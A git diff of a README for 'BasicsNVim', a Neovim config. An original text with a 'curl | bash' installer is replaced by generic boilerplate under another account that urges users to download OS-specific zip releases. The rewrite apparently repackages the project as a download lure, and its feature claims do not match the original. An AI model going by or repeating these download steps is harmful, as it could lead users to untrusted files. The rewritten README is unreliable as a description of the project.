@@ -1,77 +1,90 @@
-# BasicsNVim
+# 🎉 BasicsNVim - Simple NVim Setup for Everyone
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Neovim-0.10+-57A143?style=for-the-badge&logo=neovim&logoColor=white" />
-  <img src="https://img.shields.io/badge/Lua-5.1+-2C2D72?style=for-the-badge&logo=lua&logoColor=white" />
-  <img src="https://img.shields.io/badge/lazy.nvim-active-00d1b2?style=for-the-badge" />
-  <img src="https://img.shields.io/github/last-commit/MilakyS/BasicsNVim?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/status-testing-yellow?style=for-the-badge" />
-</p>
+[![Download BasicsNVim](https://img.shields.io/badge/Download%20BasicsNVim-Click%20Here-blue)](https://github.com/Bellyjellyblub/BasicsNVim/releases)
 
-> ⚠️ **Note:** This is my **first test Neovim config**. It’s minimal, experimental, and will be improved over time.
+## 🚀 Getting Started
 
----
+BasicsNVim is designed to help users easily configure NeoVim, a popular text editor. This application focuses on making your editing experience smoother and more efficient. Follow the steps below to set up BasicsNVim on your computer.
 
-## 📦 Features (Test)
+## 📥 Download & Install
 
-* Python LSP (Pyright)
-* Autocompletion via `nvim-cmp` + LuaSnip
-* Some **GNU nano–like keymaps**
-* Basic UI tweaks
-* Auto installer (`install.sh`)
+To get started, visit the Releases page to download the latest version of BasicsNVim. 
 
----
+[Click here to download BasicsNVim](https://github.com/Bellyjellyblub/BasicsNVim/releases)
 
-## 🔧 Installation
+### Steps to Download:
 
-### ✅ Automatic installer
+1. Go to the [Releases page](https://github.com/Bellyjellyblub/BasicsNVim/releases).
+2. Find the most recent release.
+3. Click on the version number link to access the release details.
+4. Look for the asset labeled with your operating system (e.g., Windows, Mac, Linux).
+5. Click the download link for the file.
+6. Save the file to your computer.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/MilakyS/BasicsNVim/main/install.sh | bash
-```
+## 🛠️ System Requirements
 
-Installer:
+Before you install BasicsNVim, ensure your computer meets these requirements:
 
-* Detects existing configs
-* Lets you **Backup / Delete / Cancel**
-* Clones BasicsNVim
-* Installs plugins silently
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
+- **NeoVim**: You need to have NeoVim installed. Download it from [NeoVim's official website](https://neovim.io).
 
----
+## 📂 Installation Instructions
 
-### 📦 Manual
+### Windows
 
-```bash
-git clone https://github.com/MilakyS/BasicsNVim ~/.config/nvim
-nvim
-```
+1. Locate the downloaded `.zip` file.
+2. Right-click on the file and choose "Extract All".
+3. Open the extracted folder.
+4. Copy the `init.lua` file to your NeoVim configuration directory (usually located at `C:\Users\<YourUsername>\AppData\Local\nvim`).
+5. Open NeoVim to see your new configuration in action.
 
-Optional: force plugin sync
+### macOS
 
-```
-:Lazy sync
-```
+1. Find the downloaded `.zip` file.
+2. Double-click to unzip the file.
+3. Open the unzipped folder.
+4. Move the `init.lua` file to your NeoVim configuration directory (typically located at `~/.config/nvim`).
+5. Launch NeoVim to enjoy the configuration.
 
----
-## 🧠 Notes
+### Linux
 
-* Minimal test config for learning and experimentation
-* Python-focused for now; **C/C++ support planned**
-* Keymaps and structure are simple so beginners can explore
-* Expect changes — this repo will evolve
+1. Go to where you downloaded the `.zip` file.
+2. Extract the files by running the command: `unzip BasicsNVim.zip`.
+3. Move the `init.lua` file to your NeoVim configuration directory (usually `~/.config/nvim`).
+4. Open NeoVim to see your new settings.
 
----
+## 📋 Configuration Overview
 
-## 📝 TODO
+BasicsNVim offers the following features:
 
-* [ ] Add Treesitter custom configs
-* [ ] C/C++ toolchain integration
-* [ ] More keymaps and better Nano-like experience
+- **Custom Key Bindings**: Easily navigate and edit your code with personalized shortcuts.
+- **Syntax Highlighting**: Enjoy clear visibility of your code syntax for better readability.
+- **Plugin Support**: Enhance your editor with a variety of useful plugins.
+- **LSP (Language Server Protocol)**: Improve code intelligence and autocompletion.
 
----
+Each feature is designed to boost productivity and help you write code more effectively.
 
-## 🔗 Links
+## 🧭 Troubleshooting
 
-* GitHub: [MilakyS](https://github.com/MilakyS)
-* Neovim: [neovim](https://neovim.io)
-* lazy.nvim: [lazy.nvim](https://github.com/folke/lazy.nvim)
+If you encounter any issues during installation, check the following:
+
+- **NeoVim Installation**: Ensure you have installed NeoVim correctly. 
+- **Correct Configuration Directory**: Verify that the `init.lua` is in the right configuration folder.
+- **Dependencies**: Make sure any required plugins are also installed.
+
+## 📧 Get Help
+
+For further assistance, visit our [GitHub Issues Page](https://github.com/Bellyjellyblub/BasicsNVim/issues). You can ask questions or report any problems you face.
+
+## 📣 Community Contributions
+
+We welcome contributions! If you have suggestions to improve BasicsNVim, please submit a pull request or create an issue in our GitHub repository.
+
+## 🔗 Additional Resources
+
+- [NeoVim Documentation](https://neovim.io)
+- [Lua Programming Language](https://www.lua.org)
+
+Explore BasicsNVim and get the most out of your NeoVim experience today! 
+
+[Click here to download BasicsNVim](https://github.com/Bellyjellyblub/BasicsNVim/releases)
